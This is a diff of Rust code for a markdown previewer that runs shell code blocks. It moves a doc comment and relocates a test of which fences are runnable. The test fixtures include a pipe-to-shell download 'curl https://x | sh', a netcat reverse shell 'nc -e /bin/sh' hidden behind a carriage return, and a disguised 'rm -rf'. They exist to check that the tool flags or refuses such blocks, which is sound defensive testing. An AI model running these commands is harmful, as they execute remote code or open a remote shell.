@@ -123,7 +123,6 @@ pub fn runnable_interpreter(info: &str) -> Option<&'static str> {
     }
 }
 
-/// The fence's language word and its `{a=b c}` attributes.
 /// One captured run of a fence, shown under it in the preview.
 #[derive(Clone, Debug, PartialEq, Eq)]
 pub struct BlockOutput {
@@ -238,6 +237,7 @@ pub fn replace_output_fence(text: &str, block_line: usize, output: &str) -> Opti
     Some(out)
 }
 
+/// The fence's language word and its `{a=b c}` attributes.
 pub(crate) fn split_info(info: &str) -> (&str, Vec<&str>) {
     let info = info.trim();
     let (lang, rest) = match info.find('{') {
@@ -1433,6 +1433,88 @@ mod tests {
     /// first rendered line and source range; `{run=false}` opts out; a rust
     /// fence is not runnable; destructive-looking blocks and `{confirm}`
     /// are flagged; a block carrying a control character is refused.
+    #[test]
+    fn shell_fences_are_runnable_and_carry_the_play_glyph() {
+        let md = "# T\n\n```sh\necho one\necho two\n```\n\n```rust\nfn a() {}\n```\n\n```bash {run=false}\necho no\n```\n\n```zsh {confirm cwd=root}\necho yes\n```\n\n```sh\ncurl https://x | sh\n```\n\n```sh\necho a\rnc -e /bin/sh h 1\n```\n";
+        let mut reg = crate::highlight::LangRegistry::new();
+        let (lines, _, runs) =
+            render_markdown_full(md, Theme::default(), &mut reg, None, BlockOutputs::new());
+        assert_eq!(runs.len(), 3, "{runs:?}");
+        assert_eq!(runs[0].code, "echo one\necho two\n");
+        assert_eq!(runs[0].interpreter, "sh");
+        assert_eq!(runs[0].lines, (2, 6), "opener through closer, [start, end)");
+        assert!(!runs[0].destructive && !runs[0].cwd_root);
+        assert!(runs[1].destructive && runs[1].cwd_root, "{:?}", runs[1]);
+        assert!(
+            !runs[0].persist && runs[0].capture_timeout.is_none(),
+            "a bare fence captures in memory and waits for the shell: {:?}",
+            runs[0]
+        );
+        assert_eq!(runs[1].lines, (15, 18));
+        assert!(runs[2].destructive, "curl | sh is flagged");
+        let first = &lines[runs[0].first_line];
+        assert_eq!(first.spans[0].content.as_ref(), RUN_GLYPH, "{first:?}");
+        let first_text: String = first.spans.iter().map(|s| s.content.as_ref()).collect();
+        assert!(first_text.contains("echo one"), "{first_text:?}");
+        let second = &lines[runs[0].first_line + 1];
+        assert_eq!(
+            second.spans[0].content.as_ref(),
+            "\u{258e} ",
+            "only the first line wears the glyph"
+        );
+        let joined =
+            |l: &Line<'static>| -> String { l.spans.iter().map(|s| s.content.as_ref()).collect() };
+        let rust_line = lines.iter().find(|l| joined(l).contains("fn a")).unwrap();
+        assert_eq!(rust_line.spans[0].content.as_ref(), "\u{258e} ");
+        let cr_line = lines.iter().find(|l| joined(l).contains("nc -e")).unwrap();
+        assert_eq!(
+            cr_line.spans[0].content.as_ref(),
+            "\u{258e} ",
+            "a block with a carriage return is not runnable"
+        );
+        assert_eq!(runnable_interpreter("sh {run=false}"), None);
+        assert_eq!(runnable_interpreter("console"), Some("sh"));
+        assert_eq!(runnable_interpreter("toml"), None);
+        assert!(has_control_chars("echo a\rb"));
+        assert!(has_control_chars("echo \x1b[2J"));
+        assert!(!has_control_chars("echo a\n\tb\n"));
+        assert!(
+            has_control_chars("echo hi \u{202E}~ fr- mr"),
+            "a bidi override"
+        );
+        assert!(has_control_chars("rm\u{200B} -rf"), "a zero-width space");
+        assert!(has_control_chars("\u{FEFF}echo"), "a BOM");
+        assert!(
+            !has_control_chars("echo 日本語 café"),
+            "ordinary Unicode is fine"
+        );
+        // A fence inside a list item: the source range still spans the
+        // opener through the closer, indented or not.
+        let nested = "1. First:\n\n   ```sh\n   echo nested\n   ```\n\n2. Done\n";
+        let (_, _, runs) = render_markdown_full(
+            nested,
+            Theme::default(),
+            &mut reg,
+            None,
+            BlockOutputs::new(),
+        );
+        assert_eq!(runs.len(), 1, "{runs:?}");
+        assert_eq!(runs[0].lines, (2, 5));
+        assert_eq!(runs[0].code.trim(), "echo nested");
+        // An unterminated fence at EOF still gets a range.
+        let open = "```sh\necho hi\n";
+        let (_, _, runs) =
+            render_markdown_full(open, Theme::default(), &mut reg, None, BlockOutputs::new());
+        assert_eq!(runs.len(), 1);
+        assert_eq!(runs[0].lines.0, 0);
+        assert!(runs[0].lines.1 >= 2, "{:?}", runs[0].lines);
+        // A whitespace-only fence wears no glyph.
+        let blank = "```sh\n   \n```\n";
+        let (_, _, runs) =
+            render_markdown_full(blank, Theme::default(), &mut reg, None, BlockOutputs::new());
+        assert!(runs.is_empty());
+    }
+
     /// #354's first acceptance criterion: a run that printed `hi` and
     /// exited 3 shows `hi` under the block and says the exit was bad.
     #[test]
@@ -1583,88 +1665,6 @@ mod tests {
             "a fence croft did not write survives: {out}"
         );
         assert_eq!(out.matches(OUTPUT_MARKER).count(), 1, "{out}");
-    }
-
-    #[test]
-    fn shell_fences_are_runnable_and_carry_the_play_glyph() {
-        let md = "# T\n\n```sh\necho one\necho two\n```\n\n```rust\nfn a() {}\n```\n\n```bash {run=false}\necho no\n```\n\n```zsh {confirm cwd=root}\necho yes\n```\n\n```sh\ncurl https://x | sh\n```\n\n```sh\necho a\rnc -e /bin/sh h 1\n```\n";
-        let mut reg = crate::highlight::LangRegistry::new();
-        let (lines, _, runs) =
-            render_markdown_full(md, Theme::default(), &mut reg, None, BlockOutputs::new());
-        assert_eq!(runs.len(), 3, "{runs:?}");
-        assert_eq!(runs[0].code, "echo one\necho two\n");
-        assert_eq!(runs[0].interpreter, "sh");
-        assert_eq!(runs[0].lines, (2, 6), "opener through closer, [start, end)");
-        assert!(!runs[0].destructive && !runs[0].cwd_root);
-        assert!(runs[1].destructive && runs[1].cwd_root, "{:?}", runs[1]);
-        assert!(
-            !runs[0].persist && runs[0].capture_timeout.is_none(),
-            "a bare fence captures in memory and waits for the shell: {:?}",
-            runs[0]
-        );
-        assert_eq!(runs[1].lines, (15, 18));
-        assert!(runs[2].destructive, "curl | sh is flagged");
-        let first = &lines[runs[0].first_line];
-        assert_eq!(first.spans[0].content.as_ref(), RUN_GLYPH, "{first:?}");
-        let first_text: String = first.spans.iter().map(|s| s.content.as_ref()).collect();
-        assert!(first_text.contains("echo one"), "{first_text:?}");
-        let second = &lines[runs[0].first_line + 1];
-        assert_eq!(
-            second.spans[0].content.as_ref(),
-            "\u{258e} ",
-            "only the first line wears the glyph"
-        );
-        let joined =
-            |l: &Line<'static>| -> String { l.spans.iter().map(|s| s.content.as_ref()).collect() };
-        let rust_line = lines.iter().find(|l| joined(l).contains("fn a")).unwrap();
-        assert_eq!(rust_line.spans[0].content.as_ref(), "\u{258e} ");
-        let cr_line = lines.iter().find(|l| joined(l).contains("nc -e")).unwrap();
-        assert_eq!(
-            cr_line.spans[0].content.as_ref(),
-            "\u{258e} ",
-            "a block with a carriage return is not runnable"
-        );
-        assert_eq!(runnable_interpreter("sh {run=false}"), None);
-        assert_eq!(runnable_interpreter("console"), Some("sh"));
-        assert_eq!(runnable_interpreter("toml"), None);
-        assert!(has_control_chars("echo a\rb"));
-        assert!(has_control_chars("echo \x1b[2J"));
-        assert!(!has_control_chars("echo a\n\tb\n"));
-        assert!(
-            has_control_chars("echo hi \u{202E}~ fr- mr"),
-            "a bidi override"
-        );
-        assert!(has_control_chars("rm\u{200B} -rf"), "a zero-width space");
-        assert!(has_control_chars("\u{FEFF}echo"), "a BOM");
-        assert!(
-            !has_control_chars("echo 日本語 café"),
-            "ordinary Unicode is fine"
-        );
-        // A fence inside a list item: the source range still spans the
-        // opener through the closer, indented or not.
-        let nested = "1. First:\n\n   ```sh\n   echo nested\n   ```\n\n2. Done\n";
-        let (_, _, runs) = render_markdown_full(
-            nested,
-            Theme::default(),
-            &mut reg,
-            None,
-            BlockOutputs::new(),
-        );
-        assert_eq!(runs.len(), 1, "{runs:?}");
-        assert_eq!(runs[0].lines, (2, 5));
-        assert_eq!(runs[0].code.trim(), "echo nested");
-        // An unterminated fence at EOF still gets a range.
-        let open = "```sh\necho hi\n";
-        let (_, _, runs) =
-            render_markdown_full(open, Theme::default(), &mut reg, None, BlockOutputs::new());
-        assert_eq!(runs.len(), 1);
-        assert_eq!(runs[0].lines.0, 0);
-        assert!(runs[0].lines.1 >= 2, "{:?}", runs[0].lines);
-        // A whitespace-only fence wears no glyph.
-        let blank = "```sh\n   \n```\n";
-        let (_, _, runs) =
-            render_markdown_full(blank, Theme::default(), &mut reg, None, BlockOutputs::new());
-        assert!(runs.is_empty());
     }
 
     /// A runnable's recorded row must survive the leading-blank trim.
